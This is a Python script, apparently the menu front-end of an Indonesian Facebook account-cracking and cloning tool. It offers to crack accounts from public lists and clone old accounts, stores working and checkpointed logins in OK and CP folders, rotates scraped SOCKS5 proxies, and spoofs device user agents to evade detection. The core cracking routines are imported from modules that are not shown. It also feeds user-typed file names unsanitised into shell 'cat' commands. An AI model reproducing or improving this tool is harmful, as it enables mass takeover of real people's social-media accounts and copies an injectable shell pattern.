#!/usr/bin/python3
# -*- coding: utf-8 -*-


import os
try:
    import requests
except ImportError:
    os.system('pip install requests' if os.name == 'nt' else 'pip install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip install futures' if os.name == 'nt' else 'pip install futures')
try:
    from bs4 import BeautifulSoup
except ImportError:
    os.system('pip install bs4' if os.name == 'nt' else 'pip install bs4')
try:
    import rich
except ImportError:
    os.system('pip install rich' if os.name == 'nt' else 'pip install rich')

import requests, re, os, random, sys,bs4,time,json
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from random import choice
from concurrent.futures import ThreadPoolExecutor as upil
from datetime import date
from datetime import datetime
from urllib.parse import quote
from platform import platform
from urllib.error import URLError
from rich import print as prints
from rich.panel import Panel
from rich.tree import Tree
from data import dump as dup
from data import cokz as sx
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
 	if n < 0 or n > 12:
 		exit()
 	nTemp = n - 1
except ValueError:
 	exit()
current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'
hapus  = '[/]'
biru_m = '[bold cyan]'
warna_rich = random.choice(["[bold red]","[deep_pink3]","[blue]","[green]","[cyan]"])
warna = random.choice(["[deep_pink3]","[green]","[cyan]","[blue]"])
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m' #
ta = current.year
bu = current.month
ha = current.day
op = bulan_[nTemp]
tanggal = '%s-%s-%s'%(ha,op,ta)
tanggal.split('/')
ses=requests.session()
loop = 0
id = []
ok = []
cp = []

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('* \033[0m[\033[1;96mCluuuut\033[0m]')
prox=open('.prox.txt','r').read().splitlines()


def folder():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	menu()

def real_time():
	from time import time
	return str(time()).split('.')[0]

def banner():
	print('''.oPYo.                     8 \n8    8                     8 \n8      oPYo. .oPYo. .oPYo. 8  .o \n8      8  `' .oooo8 8    ' 8oP' \n8      8     8    8 8    . 8 `b. \n`YooP' 8     `YooP8 `YooP' 8  `o. \n:......:..:::::.....::.....:..::......\n: ##### :   \033[1;93mUPIL FACEBOOK\033[0m    : ##### :\n::::::::::::::::::::::::::::::::::::::''') 

def hapus_log():
	try:os.sytem('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
	except:pass

def menu():
	os.system('clear');banner()
	try:
		tokenz = open(".token.txt", "r").read()
		cookie = {'cookie': open(".cokie.txt", "r").read()}
	except FileNotFoundError:
		time.sleep(2);sx.Login()
	prints(f"\n * {biru_m}01{hapus}. CRACK DARI PUBLIK \n * {biru_m}02{hapus}. CLONING RANDOM ACCOUNT OLD \n * {biru_m}03{hapus}. CEK HASIL CRACK & CLONING \n * {biru_m}04{hapus}. ATUR USER AGENT \n * {biru_m}00{hapus}. {merah}Keluar{hapus}")
	pil = input(f"\n *{N} menu : ")
	if pil in[""," "]:
		print("");prints(Panel("😡[bold red] jangan kosong "));time.sleep(2);menu()
	elif pil in["1","01"]:
		dup.Dump().dump_prem(cookie, tokenz)
	elif pil in["2","02"]:
		jadul()
	elif pil in["3","03"]:
		cek_hasil()
	elif pil in["4","04"]:
		set_ua()
	elif pil in['0','00']:
		titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
		for x in titik:
			sys.stdout.write(f"\r  [{M}Ã—{N}] menghapus cookie {N}{x}{N}");sys.stdout.flush()
			time.sleep(1)
			hapus_log()
		print("");prints(Panel(f"[{hijau}âœ“{hapus}] berhasil menghapus cookie"));exit()
	else:
            print("");prints(Panel(f"ðŸ˜¡ memu [bold red]{pil}[/] tidak ada, cek menu nya!"));time.sleep(2);menu()

def cek_hasil():
	print(f"\n * 1 hasil crack OK\n * 2 hasil crack CP")
	ask = input("\n * pilih : ")
	if ask in ["1"]:
		dirs = os.listdir("OK")
		print(" * list nama file tersimpan di folder OK\n")
		for file in dirs:print(" * "+file)
		try:
			file = input("\n * pilih nama file : ")
			if file == "":menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:exit(" * file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ");del_txt = nm_file.replace(".txt", "")
		print(" * [#] -------------------------------------")
		print(" * hasil : %s total : %s\033[0;92m"%(del_txt, len(totalok)))
		os.system("cat OK/%s"%(file))
		print("\033[0m * [#] -------------------------------------")
		print(" * copy dan di simpan hasilnya")
		input(" * kembali untuk enter : ")
		menu()
	elif ask in ["2"]:
		dirs = os.listdir("CP")
		print(" * list nama file tersimpan di folder CP\n")
		for file in dirs:print(" * "+file)
		try:
			file = input("\n * pilih nama file : ")
			if file == "":menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:exit(" * file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ");del_txt = nm_file.replace(".txt", "")
		print(" * [#] -------------------------------------")
		print(" * hasil : %s total : %s\033[0;93m"%(del_txt, len(totalcp)))
		os.system("cat CP/%s"%(file))
		print("\033[0m * [#] ------------------------------------")
		print(" * copy dan di simpan hasilnya\n")
		input(" * kembali di enter : ")
		menu()
	else:menu()

def set_ua():
	os.system('rm -rf uaku.txt')
	print("\n * 01. Gunakan user agent hp sendiri \n * 02. user agent bawaan script \n * 03. user agent random \n * 04. user agent fb lite \n * 05. \033[1;96mmulai crack \n * 00. Kembali ")
	pil = input(f" \n* pilih : ")
	if pil in["1","01"]:
           try:os.sytem("rm -rf uaku.txt")
           except:pass
           ua = input(" * masukan user agent: ")
           open("uaku.txt", "w").write(ua)
           print("berhasil mengganti user agent");input(f" [ {O}Kembali{N} ] ");jadul()
	elif pil in["2", "02"]:
            try:os.system("rm -rf uaku.txt")
            except:pass
            ee = requests.get('https://yayanxd.my.id/server/ua.txt').text
            open("uaku.txt", "w").write(ee)
            print("berhasil mengganti user agent");input(f" [ {O}Kembali{N} ] ");menu()
	elif pil in["3", "03"]:
		try:os.system("uaku.txt")
		except:pass
		ua_random()
	elif pil in['4','04']:
		uas=[]
		a = requests.get("https://github.com/el-fir4/el/blob/main/ua.txt").text
		ua = open('uaku.txt','w')
		xx=re.findall('line">(.*?)<', str(a))
		for x in xx:
			ua.write(x+"\n")
		ua=open("uaku.txt", "r").read().splitlines()
		for i in ua:
			uas.append(i)
		print(f" \n * berhasil menyimpan ua fb lite")
	elif pil in["5", "05"]:
		set_ua()
	elif pil in["0", "00"]:
		menu()
	else:
            print(f" * input yang benar");set_ua()

def ua_random():
        print(f"\n* \033[1;93mSILAHKAN PILIH USER AGENT YANG MENURUT ANDA COCOK \033[1;96m \n* 01. Samsung    * 05. Vivo       * 09. Huawei \n* 02. Nokia      * 06. Iphone     * 10. Windows \n* 03. Xiomi      * 07. Asus       * 11. Chrome \n* 04. Oppo       * 08. lenovo     * 12. Facebook\n")
        cxx = input(f"{N}\n* menu ")
        if cxx in["", " "]:
            print(f" *  jangan kosong");ua_random()
        elif cxx in["1", "01"]:
            type = 'software_name/samsung-browser'
        elif cxx in["2", "02"]:
            type = 'software_name/nokia-browser'
        elif cxx in["3", "03"]:
            type = 'operating_platform_string/xiaomi-mi-a1'
        elif cxx in["4", "04"]:
            type = 'operating_platform_string/oppo-f1s-a1601'
        elif cxx in["5", "05"]:
            type = 'operating_platform_string/vivo'
        elif cxx in["6", "06"]:
            type = 'operating_platform_string/apple'
        elif cxx in["7", "07"]:
            type = 'operating_platform_string/asus'
        elif cxx in["8", "08"]:
            type = 'operating_platform_string/lenovo'
        elif cxx in["9", "09"]:
            type = 'operating_platform_string/huawei'
        elif cxx in["10"]:
            type = 'operating_system_name/windows'
        elif cxx in["11"]:
            type = 'operating_system_name/chrome-os'
        elif cxx in["12"]:
            type = 'facebook-lite'
        else:
            print(f" *  input yang bener");ua_random()
        url = "https://developers.whatismybrowser.com/useragents/explore/"+ type
        with requests.Session() as xyz:
            req = xyz.get(url)
            pra = parser(req.content,'html.parser')
            li = re.findall('<td><a class=\".*?\" href=\".*?\">(.*?)</a></td>',str(pra))
            for y in li:
                try:
                    ue=[]
                    asd = 0
                    data_ua={}
                    asd += 1
                    x = f"{y}"
                    pu = str(asd)
                    data_ua.update({pu:x.replace('[#AAAAAA]','')})
                    open('uaku.txt','a').write(x+'\n')
                except KeyboardInterrupt:
                    break
        menu()


if __name__=='__main__':
	folder()
